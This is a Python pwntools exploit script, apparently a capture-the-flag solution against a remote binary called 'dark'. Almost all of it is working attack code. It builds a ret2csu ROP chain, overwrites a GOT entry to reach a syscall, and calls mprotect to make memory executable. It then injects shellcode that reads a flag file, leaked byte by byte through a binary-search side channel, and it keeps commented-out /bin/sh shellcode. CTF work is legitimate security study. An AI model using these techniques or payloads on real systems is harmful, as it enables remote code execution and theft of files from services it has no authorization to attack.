#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *
import time
import os
from hashlib import sha256

#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal=["tmux","splitw","-h"]

def start_new_program():
    program = remote( "121.41.41.111", 9999)
    return program
'''
def start_new_program():
    return process("./dark")
'''
def fuckflag():
    # 设置断点
    # 可见字符 32--126
    flag = ''

    for i in range(55, 70):
        log.info('flag=' + flag)
        l = 32
        r = 126
        old = None
        new = None
        while True:
            mid = (l + r) // 2
            program = start_new_program()
            if guess(program, 1, i, mid): # if > mid
                l = mid + 1
            else:
                r = mid
            #program.interactive()
            program.close()
            old = new
            new = mid
            if old == new:
                flag += chr(old)
                break
        if flag[-1] == '}':
            break
    log.info('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
    log.info('flag=' + flag)
            
# sha256(chal + sol).hexdigest().startswith('00000')
    # fp = open('out.data', 'wb')
    # fp.write(payload)
    # fp.close()

    
    
    

def guess(program, op, n, ch):
    payload = guess_payload(op, n, ch)
    log.info('len=0x%x' % len(payload))
    payload = payload.ljust(0x8000 - 1, '\x00')
    #payload = ''.ljust(0x8000 - 1, '\x00')
    program.sendline(payload)
    sleep(0.5)
    opc1 = ['=', '>', '<']
    opc2 = ['!=', '<=', '>=']
    try:
        program.sendline('fuck!')
    except:
        log.info('flag[%d]%s%c' % (n, opc1[op], ch))
        return True
    log.info('flag[%d]%s%c' % (n, opc2[op], ch))
    return False    

def guess_payload(op, n, ch):
    # 0 相等
    # 1 大于
    # 2 小于
    shellcode1 = asm(shellcraft.amd64.linux.open('flag'))
    shellcode1 += asm('''mov rbx, rax''')
    shellcode1 +=asm(shellcraft.amd64.linux.read('rbx', 0x000000000404250, 70))
    shellcode2 = asm('''
    mov rax, 0x%x
    xor rbx, rbx
    mov bl, byte ptr [rax]
    ''' % (0x000000000404250 + n, ))
    if op == 0:
        shellcode2 += asm('''
        fuck:
        cmp bl, 0x%x
        jnz fuck
        ''' % ch)
    elif op == 1:
        shellcode2 += asm('''
        fuck:
        cmp bl, 0x%x
        jng fuck
        ''' % ch)
    elif op == 2:
        shellcode2 += asm('''
        fuck:
        cmp bl, 0x%x
        jnl fuck
        ''' % ch)
    shellcode3 = asm(shellcraft.amd64.linux.exit(0))
    payload = make_shellcode(shellcode1 + shellcode2 + shellcode3)
    return payload


def make_shellcode(shellcode):
    '''
    remote libc
    read
    .text:00000000000DB6D0                 cmp     rax, 0FFFFFFFFFFFFF001h

    mprotect 0xE44D0
    '''
    # 0x00601040 alarm got
    # 0x0601048  read  got
    # read(0, 0x00601040, 1)  rdi, rsi, rdx
    # 
    #0x0000000000400a53 : pop rdi ; ret 
    elf=ELF("./dark")
    read_got=elf.got["read"]
    csu_foot=0x000000000401272
    csu_head=0x000000000401258
    # 初始时rdi=0 rbx=0
    fake_stack=0x000000000404050+0x400
    pop_rsp_pop3_ret=0x0000000000401275
    payload1 = 'a'*0x10 + p64(1) #rbp=1
    # 0x400A4E pop r12; pop r13; pop r14; pop r15 ret;
    payload1 += p64(0x000000000401274) # csu_foot
    payload1 += p64(0x000000000404038) # r12 read_got ; call read
    payload1 += p64(0) # r13
    payload1 += p64(0x000000000404030) # r14 alarm got
    payload1 += p64(1) # r15
    payload1 += p64(0x000000000401258) # mov rdx, r13; mov rsi, r14; mov rdx r15; call [r12 + rbx*8]
    payload1 += 'a'*56    # padding
    payload1 += p64(csu_foot)
    payload1 += p64(0)
    payload1 += p64(1)
    payload1 += p64(read_got) # du ru rop
    payload1 += p64(0) 
    payload1 += p64(fake_stack)
    payload1 += p64(0x1000)
    payload1 += p64(csu_head)
    payload1 += 'A'*56
    payload1 += p64(pop_rsp_pop3_ret)
    payload1 += p64(fake_stack-8-8-8)
    payload1 += p64(0)*3 #padding
    payload1 = payload1.ljust(0x1000, '\x00')    
    

    payload2 = '\x45' # 覆盖alarm got最后为0x80 则指向 syscall

    alarm_got = 0x000000000404030
    
    payload3 = p64(csu_foot) 
    payload3 +=p64(0)
    payload3 +=p64(1)
    payload3 +=p64(read_got)
    payload3 +=p64(0)
    payload3 +=p64(fake_stack+0x200)
    payload3 +=p64(0xa) # make rax =  0xa
    payload3 +=p64(csu_head)
    payload3 +='A'*56
    shellcode_addr =  fake_stack+0x600
    payload3 +=p64(csu_foot)
    payload3 += p64(0) # rbx
    payload3 += p64(1) # rbp
    payload3 += p64(alarm_got) # r12 syscall
    payload3 += p64(shellcode_addr&0xfffff000) # r13 0x1+0x2+0x4 rwx
    payload3 += p64(0x4000) # r14 size
    payload3 += p64(0x7) # r15 addr
    payload3 += p64(csu_head) # mov rdx, r13; mov rsi, r14; mov rdx r15; call [r12 + rbx*8]

    payload3 += 'a'*8    # padding
    payload3 += p64(0) # rbx
    payload3 += p64(1) # rbp
    payload3 += p64(0x000000000404038) # r12 read_Got call read
    payload3 += p64(0) # r13
    payload3 += p64(shellcode_addr) # r14 bss
    payload3 += p64(0x200) # r15
    payload3 += p64(csu_head)
    payload3 += 'A'*56
    payload3 += p64(shellcode_addr)
    payload3 = payload3.ljust(0x1000, '\x00')



    payload4 = 'a'*0xa # 修改rax


    payload6 = shellcode
    payload6 = payload6.ljust(0x200, '\x00')
    

    payload = payload1 + payload2 + payload3 + payload4+ payload6

    return payload


def main():

    fuckflag()

def debug():
    gdb.attach(a,'''
    b *(0x00000000040121E)
    b *(0x000000000401261)
    ''')

if __name__ == '__main__':
    main()
    '''
    shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    
    a=process("./dark")
    context.binary = "./dark"
    payload = make_shellcode(shellcode_x64)
    debug()
    a.sendline(payload)
    a.interactive()
    '''